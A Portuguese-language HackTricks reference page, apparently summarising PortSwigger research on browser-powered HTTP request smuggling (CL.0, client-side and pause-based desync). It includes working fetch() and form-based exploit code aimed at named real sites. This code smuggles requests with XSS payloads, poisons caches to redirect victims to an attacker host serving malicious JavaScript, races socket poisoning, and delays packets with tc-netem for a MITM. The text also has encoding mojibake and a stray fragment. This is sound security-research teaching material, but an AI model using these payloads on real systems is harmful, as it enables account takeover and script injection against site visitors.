# Browser HTTP Request Smuggling

<details>

<summary><strong>Aprenda hacking no AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao grupo** üí¨ [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo [**telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para os reposit√≥rios do GitHub** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
## CL.0/H2.0 desync compat√≠vel com navegador

Esta vulnerabilidade ocorre quando o cabe√ßalho **Content Length** (CL) √© completamente **ignorado** pelo **servidor backend**. Ent√£o, o backend trata o **corpo** como o **in√≠cio do m√©todo da segunda requisi√ß√£o**. Ignorar o CL √© equivalente a trat√°-lo como se tivesse um valor de 0, portanto, isso √© um desync CL.0 - uma classe de ataque [conhecida](https://i.blackhat.com/USA-20/Wednesday/us-20-Klein-HTTP-Request-Smuggling-In-2020-New-Variants-New-Defenses-And-New-Challenges.pdf) mas menos explorada.

![](<../../.gitbook/assets/image (3) (1) (2).png>)

O ataque foi poss√≠vel porque o servidor backend simplesmente **n√£o estava esperando uma requisi√ß√£o POST**.

{% hint style="warning" %}
Note que esta vulnerabilidade √© **ativada** por uma requisi√ß√£o HTTP **completamente v√°lida**, em conformidade com a especifica√ß√£o. Isso significa que o **front-end n√£o tem nenhuma chance de prote√ß√£o** contra ela, e ela poderia at√© ser ativada por um navegador.
{% endhint %}

A √∫nica **diferen√ßa** entre **CL.0** e **H2.0** √© que o segundo est√° usando **HTTP2** (que tem um cabe√ßalho de comprimento de conte√∫do impl√≠cito), mas o **backend tamb√©m n√£o est√° usando isso**.

## Desync do Lado do Cliente

Ataques de desync tradicionais **envenenam** a **conex√£o** entre um servidor **front-end e backend**, e por isso s√£o imposs√≠veis em sites que n√£o usam uma arquitetura front-end/backend. Estes s√£o **desyncs do lado do servidor** a partir de agora. A maioria dos **desyncs do lado do servidor** s√≥ pode ser ativada por um **cliente HTTP personalizado emitindo uma requisi√ß√£o malformada.**

A capacidade de um **navegador causar um desync** possibilita uma nova classe de amea√ßa chamada **desync do lado do cliente** (CSD).\
Um ataque CSD come√ßa com a **v√≠tima visitando o site do atacante**, que ent√£o faz com que o navegador dela envie **duas requisi√ß√µes cross-domain para o site vulner√°vel**. A **primeira** requisi√ß√£o √© elaborada para **desyncar a conex√£o do navegador** e fazer com que a **segunda requisi√ß√£o acione** uma resposta prejudicial, tipicamente dando ao atacante controle da conta da v√≠tima.

### Detectar

Um vetor CSD √© uma requisi√ß√£o HTTP com **duas** propriedades **chave**.

Primeiro, o **servidor deve ignorar o Content-Length (CL) da requisi√ß√£o**. Isso geralmente acontece porque a requisi√ß√£o ou **ativou um erro no servidor**, ou o servidor simplesmente **n√£o estava esperando uma requisi√ß√£o POST** para o endpoint escolhido. Tente mirar em **arquivos est√°ticos** e **redirecionamentos no n√≠vel do servidor**, e ativar erros via **URLs excessivamente longas**, e **semi-malformadas** como /%2e%2e.

Em segundo lugar, a requisi√ß√£o deve ser **ativ√°vel em um navegador web cross-domain**. Navegadores restringem severamente o controle sobre requisi√ß√µes cross-domain, ent√£o voc√™ tem controle limitado sobre cabe√ßalhos, e se sua requisi√ß√£o tem um corpo, voc√™ precisar√° usar o m√©todo HTTP POST. No final, voc√™ s√≥ **controla** a **URL**, al√©m de algumas outras coisas como o cabe√ßalho **Referer**, o **corpo**, e a **parte final do Content-Type.**

#### Teste de ignor√¢ncia do CL

A maneira de testar essa m√° configura√ß√£o √© **enviar 2 requisi√ß√µes e contrabandear uma** no **meio**. Se a conex√£o **contrabandeada** **afetou** a resposta da **segunda** **requisi√ß√£o**, significa que est√° **vulner√°vel**:

![](<../../.gitbook/assets/image (1) (2) (2) (1).png>)

{% hint style="warning" %}
Note que voc√™ **n√£o pode** testar essa vulnerabilidade apenas enviando um **Content-Length maior** do que o enviado e **procurando por um timeout**, porque alguns servidores **respondem** mesmo que **n√£o tenham recebido o corpo inteiro**.
{% endhint %}

√â importante notar se o **site alvo suporta HTTP**/2. Ataques CSD geralmente exploram a reutiliza√ß√£o de conex√£o HTTP/1.1 e navegadores web **preferem usar HTTP/2** sempre que poss√≠vel, ent√£o se o site alvo **suporta HTTP/2 seus ataques provavelmente n√£o funcionar√£o**. H√° uma **exce√ß√£o**; alguns **proxies avan√ßados n√£o suportam HTTP/2** ent√£o voc√™ pode explorar qualquer um que os use. Isso inclui proxies corporativos, certas VPNs intrusivas e at√© algumas ferramentas de seguran√ßa.

### Confirmar

Primeiro, selecione um site para lan√ßar o ataque. Este site deve ser **acessado via HTTPS** e localizado em um **dom√≠nio diferente do alvo**.

Em seguida, certifique-se de que voc√™ **n√£o tem um proxy configurado**, e ent√£o navegue at√© o seu site de ataque. Abra as **ferramentas de desenvolvedor** e v√° para a aba **Rede**. Para ajudar na depura√ß√£o de problemas potenciais mais tarde, recomendo fazer os seguintes ajustes:

* Selecione a caixa de sele√ß√£o **"Preserve log"**.
* Clique com o bot√£o direito nos cabe√ßalhos das colunas e **ative a coluna "Connection ID"**.

Mude para o console do desenvolvedor e execute JavaScript para replicar sua sequ√™ncia de ataque usando fetch(). Isso pode parecer algo como:
```javascript
fetch('https://example.com/', {
method: 'POST',
body: "GET /hopefully404 HTTP/1.1\r\nX: Y", // malicious prefix
mode: 'no-cors', // ensure connection ID is visible
credentials: 'include' // poison 'with-cookies' pool
}).then(() => {
location = 'https://example.com/' // use the poisoned connection
})
```
### Explora√ß√£o - Armazenar

Uma op√ß√£o √© identificar funcionalidades no site alvo que permitam **armazenar dados de texto**, e criar o prefixo de modo que os cookies da v√≠tima, cabe√ßalhos de autentica√ß√£o ou senha acabem sendo **armazenados em algum lugar que voc√™ possa recuperar**. Este fluxo de ataque funciona [quase id√™ntico ao contrabando de requisi√ß√µes do lado do servidor](https://portswigger.net/web-security/request-smuggling/exploiting#capturing-other-users-requests), ent√£o n√£o vou me aprofundar nisso.

### Explora√ß√£o - **Encadear e pivotar**

Em circunst√¢ncias normais, muitas classes de **ataque do lado do servidor** s√≥ podem ser lan√ßadas por um atacante com acesso direto ao site alvo, pois **dependem de requisi√ß√µes HTTP que os navegadores se recusam a enviar**, como **manipula√ß√£o** de **cabe√ßalhos HTTP** - envenenamento de cache da web, a maioria dos contrabandos de requisi√ß√µes do lado do servidor, ataques de cabe√ßalho de host, User-Agent baseado em [SQLi](https://portswigger.net/web-security/sql-injection), CSRF JSON Content-type e muitos outros.

O caminho mais simples para um ataque bem-sucedido veio de duas t√©cnicas-chave geralmente usadas para ataques de desincroniza√ß√£o do lado do servidor: [**envenenamento de recursos JavaScript via redirecionamentos de cabe√ßalho de Host**](https://portswigger.net/web-security/request-smuggling/exploiting#using-http-request-smuggling-to-turn-an-on-site-redirect-into-an-open-redirect), e usando o [**m√©todo HEAD**](https://portswigger.net/web-security/request-smuggling/advanced/request-tunnelling#non-blind-request-tunnelling-using-head) para juntar uma resposta com HTML prejudicial. Ambas as t√©cnicas precisaram ser **adaptadas** para superar alguns desafios novos associados √† opera√ß√£o no **navegador da v√≠tima**.

## Exemplos de Explora√ß√£o

### Exemplo de HEAD empilhado

* **Explora√ß√£o colorida**

![](<../../.gitbook/assets/image (2) (3).png>)

* **Explora√ß√£o JS**
```javascript
fetch('https://www.capitalone.ca/assets', {
method: 'POST',
// use a cache-buster to delay the response
body: `HEAD /404/?cb=${Date.now()} HTTP/1.1\r\nHost: www.capitalone.ca\r\n\r\nGET /x?x=<script>alert(1)</script> HTTP/1.1\r\nX: Y`,
credentials: 'include',
mode: 'cors' // throw an error instead of following redirect
}).catch(() => {
location = 'https://www.capitalone.ca/'
})va
```
Explica√ß√£o:

* **Abuso de CL.0** em /assets (ele redireciona para /assets/ e n√£o verifica o CL)
* **Contrabandear** uma requisi√ß√£o **HEAD** (porque as respostas HEAD ainda cont√™m um content-length)
* **Contrabandear** uma requisi√ß√£o **GET** cujo **conte√∫do** vai ser **refletido** na resposta com o payload.
* Por causa do **content-length do HEAD** req, a **resposta** desta requisi√ß√£o ser√° o **corpo da requisi√ß√£o HEAD**
* Definir **modo cors**. Normalmente isso n√£o √© feito, mas neste caso a **resposta** do servidor ao **POST inicial** √© um **redirecionamento** que, se **seguido**, o **exploit n√£o funcionar√°**. Portanto, o **modo cors** √© usado para **desencadear** um **erro** e **redirecionar** a v√≠tima com o **`catch`**.

### **Redirecionamento do cabe√ßalho do host + envenenamento de cache do lado do cliente**

* **Exploit JS**
```javascript
fetch('https://redacted/', {
method: 'POST',
body: "GET /+webvpn+/ HTTP/1.1\r\nHost: x.psres.net\r\nX: Y",
credentials: 'include'}
).catch(() => { location='https://redacted/+CSCOE+/win.js' })
```
* Uma requisi√ß√£o para `/+webvpn+/` com um **dom√≠nio diferente no cabe√ßalho Host** √© respondida com um **redirecionamento** para `/+webvpn+/index.html` para aquele **dom√≠nio** dentro do cabe√ßalho Host.
* O local na **segunda** requisi√ß√£o √© definido para `/+CSCOE+/win.js` a fim de **envenenar** o **cache** daquele arquivo `.js`.
* Esta requisi√ß√£o ser√° respondida com o redirecionamento de `/+webvpn+/` para o dom√≠nio do atacante com o caminho `/+webvpn+/index.html`
* O **cache** de **`win.js`** ser√° **envenenado** com um **redirecionamento** para a p√°gina do **atacante**, mas tamb√©m a **v√≠tima** ir√° **seguir** o redirecionamento como foi atribu√≠do na vari√°vel `location` e terminar√° na p√°gina web do atacante.
* O atacante ent√£o **redirecionar√°** a **v√≠tima** para `https://redacted/+CSCOE+/logon.html`. Esta p√°gina importar√° `/+CSCOE+/win.js`. Cujo **cache √© um redirecionamento** para o servidor do **atacante**, portanto, o atacante pode **responder com um JS malicioso**.

A **v√≠tima** ir√° **acessar** a p√°gina do **atacante** **duas vezes**, a primeira ela **espera um HTML** que redirecione a v√≠tima de volta para `https://redacted/+CSCOE+/logon.html` e a segunda ela **espera c√≥digo javascript** (o payload). Um poliglota pode ser usado para servir ambas as respostas em apenas uma:
```
HTTP/1.1 200 OK
Content-Type: text/html

alert('oh dear')/*<script>location = 'https://redacted/+CSCOE+/logon.html'</script>*/
```
### Carga √∫til HEAD com TE fragmentado

Ao procurar por CSD, voc√™ tamb√©m pode **testar URLs semi-malformadas** como `/..%2f` ou `/%2f`.

* **Exploit Colorido**

![](<../../.gitbook/assets/image (5) (2) (1).png>)

* **Exploit JS**
```javascript
fetch('https://www.verisign.com/%2f', {
method: 'POST',
body: `HEAD /assets/languagefiles/AZE.html HTTP/1.1\r\nHost: www.verisign.com\r\nConnection: keep-alive\r\nTransfer-Encoding: chunked\r\n\r\n34d\r\nx`,
credentials: 'include',
headers: {'Content-Type': 'application/x-www-form-urlencoded'
}}).catch(() => {
let form = document.createElement('form')
form.method = 'POST'
form.action = 'https://www.verisign.com/robots.txt'
form.enctype = 'text/plain'
let input = document.createElement('input')
input.name = '0\r\n\r\nGET /<svg/onload=alert(1)> HTTP/1.1\r\nHost: www.verisign.com\r\n\r\nGET /?aaaaaaaaaaaaaaa HTTP/1.1\r\nHost: www.verisign.com\r\n\r\n'
input.value = ''
form.appendChild(input)
document.body.appendChild(form)
form.submit()
}
```
* A p√°gina **`/%2f`** √© acessada para **explorar** a vulnerabilidade **CL.0**.
* Uma requisi√ß√£o **HEAD** √© contrabandeada usando um **`Transfer-Encoding: chunked` header**.
* Esse cabe√ßalho √© necess√°rio neste cen√°rio porque, caso contr√°rio, o **servidor recusava aceitar uma requisi√ß√£o HEAD com um corpo**.
* Em seguida, o usu√°rio envia um POST cujo corpo cont√©m o **final do chunk da requisi√ß√£o HEAD anterior** e uma **nova requisi√ß√£o que √© contrabandeada** com **conte√∫do** (o payload JS) que ser√° **refletido** na resposta.
* Portanto, o navegador tratar√° a **resposta √† requisi√ß√£o HEAD** como a **resposta √† requisi√ß√£o POST**, que tamb√©m **conter√°** na **resposta do corpo** que **reflete** a **entrada** do usu√°rio na segunda requisi√ß√£o contrabandeada.

### Redirecionamento do cabe√ßalho Host + RC

* **JS Exploit**
```html
<script>
function reset() {
fetch('https://vpn.redacted/robots.txt',
{mode: 'no-cors', credentials: 'include'}
).then(() => {
x.location = "https://vpn.redacted/dana-na/meeting/meeting_testjs.cgi?cb="+Date.now()
})
setTimeout(poison, 120) // worked on 140. went down to 110
}

function poison(){
sendPoison()
sendPoison()
sendPoison()
setTimeout(reset, 1000)
}

function sendPoison(){
fetch('https://vpn.redacted/dana-na/css/ds_1234cb049586a32ce264fd67d524d7271e4affc0e377d7aede9db4be17f57fc1.css',
{
method: 'POST',
body: "GET /xdana-na/imgs/footerbg.gif HTTP/1.1\r\nHost: x.psres.net\r\nFoo: '+'a'.repeat(9826)+'\r\nConnection: keep-alive\r\n\r\n",
mode: 'no-cors',
credentials: 'include'
}
)
}

</script>
<a onclick="x = window.open('about:blank'); reset()">Start attack</a>
```
Neste caso, novamente, h√° um **host header** **redirect** que poderia ser usado para **hijack** uma importa√ß√£o de **JS**. No entanto, desta vez o **redirect n√£o √© cache√°vel**, ent√£o o envenenamento de **cache** do lado do cliente n√£o √© uma op√ß√£o.

Portanto, o ataque realizado far√° com que a **v√≠tima acesse a p√°gina vulner√°vel** em uma aba e ent√£o, justo **antes** da p√°gina tentar **carregar um arquivo JS**, **envenene** o socket **smuggling connections** (3 neste caso).\
Como o **timing** tem que ser extremamente **preciso**, o ataque √© realizado contra uma **nova aba a cada itera√ß√£o** at√© funcionar.

{% hint style="warning" %}
Lembre-se de que neste caso `/meeting_testjs.cgi` foi atacado porque **carrega** um **Javascript** que est√° respondendo com um **404**, ent√£o n√£o est√° em cache. Em outros cen√°rios onde voc√™ tenta atacar um **JS que est√° em cache**, voc√™ precisa esperar que ele **desapare√ßa do cache** antes de lan√ßar um novo ataque.
{% endhint %}

Passos resumidos:

* Abrir uma nova janela.
* Emitir uma solicita√ß√£o inofensiva ao alvo para estabelecer uma conex√£o nova, tornando os tempos mais consistentes.
* Navegar a janela para a p√°gina alvo em /meeting\_testjs.cgi.
* 120ms depois, criar tr√™s conex√µes envenenadas usando o gadget de redirecionamento.
* 5ms depois, enquanto renderiza /meeting\_testjs.cgi, a v√≠tima tentar√°, com sorte, importar /appletRedirect.js e ser√° redirecionada para x.psres.net, que fornece JS malicioso.
* Se n√£o, tente o ataque novamente.

## Desync baseado em pausa <a href="#pause" id="pause"></a>

Pausar tamb√©m pode criar novas vulnerabilidades de desync ao **desencadear implementa√ß√µes equivocadas de timeout de solicita√ß√£o**.

Assim, um atacante pode enviar uma solicita√ß√£o com **headers indicando que h√° um corpo**, e ent√£o **esperar** que o **front-end d√™ timeout antes de enviar o corpo**. Se o front-end der timeout mas **deixar a conex√£o aberta**, o **corpo** dessa solicita√ß√£o ser√° **tratado como uma nova solicita√ß√£o**.

### Exemplo: **Varnish**

O cache Varnish tem um recurso chamado `synth()`, que permite emitir uma **resposta sem encaminhar** a solicita√ß√£o para o back-end. Aqui est√° um exemplo de regra sendo usada para bloquear o acesso a uma pasta:
```javascript
if (req.url ~ "^/admin") {
return (synth(403, "Forbidden"));
}
```
Ao processar uma **solicita√ß√£o parcial** que corresponde a uma regra sint√©tica, o Varnish ir√° **expirar** se n√£o receber dados por **15 segundos**. Quando isso acontece, ele **deixa a conex√£o aberta** para reutiliza√ß√£o, mesmo que tenha lido apenas metade da solicita√ß√£o do socket. Isso significa que, se o **cliente continuar com a segunda metade** da solicita√ß√£o HTTP, ela ser√° interpretada como uma **nova solicita√ß√£o**.

Para desencadear um desync baseado em pausa em um front-end vulner√°vel, comece enviando seus cabe√ßalhos, prometendo um corpo e depois apenas espere. Eventualmente, voc√™ receber√° uma resposta e, quando finalmente enviar o corpo da sua solicita√ß√£o, ele ser√° interpretado como um novo pedido:

![](<../../.gitbook/assets/image (4) (3) (1).png>)

{% hint style="warning" %}
Aparentemente, isso foi corrigido em 25 de janeiro como [CVE-2022-23959](https://varnish-cache.org/security/VSV00008.html).
{% endhint %}

### Exemplo: **Apache**

Assim como o Varnish, ele √© vulner√°vel em **pontos finais onde o servidor gera a resposta por si mesmo** em vez de deixar o aplicativo lidar com a solicita√ß√£o. Uma maneira de isso acontecer √© com redirecionamentos no n√≠vel do servidor: `Redirect 301 / /en`

### Explora√ß√£o do Lado do Servidor <a href="#server" id="server"></a>

Se o servidor vulner√°vel (Apache ou Varnish neste caso) estiver no back-end, √© necess√°rio um **front-end** que **transmita a solicita√ß√£o para o servidor back-end** (cabe√ßalhos http neste caso) **sem armazenar em buffer** o corpo inteiro da solicita√ß√£o.

![](<../../.gitbook/assets/image (3) (3).png>)

Neste caso, o atacante **n√£o receber√° o tempo de resposta at√© que ele tenha enviado o corpo**. Mas se ele conhece o tempo de expira√ß√£o, isso n√£o deve ser um problema.

O Application Load Balancer (ALB) da Amazon ir√° **transmitir os dados da conex√£o conforme necess√°rio**, mas se ele **receber** a **resposta** para a solicita√ß√£o pela metade (o tempo de expira√ß√£o) **antes** de receber o **corpo**, ele **n√£o enviar√° o corpo**, ent√£o uma **Condi√ß√£o de Corrida** deve ser explorada aqui:

<figure><img src="../../.gitbook/assets/image (1) (1) (2) (1).png" alt=""><figcaption></figcaption></figure>

H√° uma complica√ß√£o adicional ao **explorar o Apache por tr√°s do ALB** - **ambos os servidores** t√™m um tempo de expira√ß√£o padr√£o de **60 segundos**. Isso deixa uma **janela de tempo extremamente pequena** para enviar a segunda parte da solicita√ß√£o. O ataque RC foi finalmente bem-sucedido ap√≥s 66 horas.

### Explora√ß√£o MITM

Aparentemente, **n√£o √© poss√≠vel interromper uma solicita√ß√£o do navegador** para explorar uma vulnerabilidade de desync baseada em pausa. No entanto, voc√™ sempre pode **realizar um ataque MITM para pausar uma solicita√ß√£o** enviada pelo navegador. Observe que este ataque **n√£o depende de descriptografar** nenhum tr√°fego.

O fluxo do ataque √© muito **semelhante a um ataque de desync do lado do cliente regular**. O usu√°rio visita uma p√°gina controlada pelo atacante, que emite uma s√©rie de **solicita√ß√µes entre dom√≠nios** para o aplicativo alvo. A **primeira solicita√ß√£o HTTP** √© deliberadamente aumentada para ser t√£o **grande** que o sistema operacional **a divida em v√°rios pacotes TCP**, permitindo que um **MITM ativo retarde o pacote final**, desencadeando um desync baseado em pausa. Devido ao preenchimento, o **atacante** pode **identificar** qual **pacote pausar** simplesmente com base no **tamanho**.

Do lado do cliente, parece um desync do lado do cliente regular usando o gadget HEAD, exceto pelo preenchimento da solicita√ß√£o:
```javascript
let form = document.createElement('form')
form.method = 'POST'
form.enctype = 'text/plain'
form.action = 'https://x.psres.net:6082/redirect?'+"h".repeat(600)+ Date.now()
let input = document.createElement('input')
input.name = "HEAD / HTTP/1.1\r\nHost: x\r\n\r\nGET /redirect?<script>alert(document.domain)</script> HTTP/1.1\r\nHost: x\r\nFoo: bar"+"\r\n\r\n".repeat(1700)+"x"
input.value = "x"
form.append(input)
document.body.appendChild(form)
form.submit()
```
No sistema do atacante realizando o MITM cego, o atraso foi implementado usando tc-NetEm:
```bash
# Setup
tc qdisc add dev eth0 root handle 1: prio priomap

# Flag packets to 34.255.5.242 that are between 700 and 1300 bytes
tc filter add dev eth0 protocol ip parent 1:0 prio 1 basic \
match 'u32(u32 0x22ff05f2 0xffffffff at 16)' \
and 'cmp(u16 at 2 layer network gt 0x02bc)' \
and 'cmp(u16 at 2 layer network lt 0x0514)' \
flowid 1:3

# Delay flagged packets by 61 seconds
tc qdisc add dev eth0 parent 1:3 handle 10: netem delay 61s
```
## **Refer√™ncias**

* Todas as informa√ß√µes deste post foram retiradas de [https://portswigger.net/research/browser-powered-desync-attacks](https://portswigger.net/research/browser-powered-desync-attacks)

<details>

<summary><strong>Aprenda hacking no AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao grupo** üí¨ [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo [**telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para os reposit√≥rios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) no github.

</details>
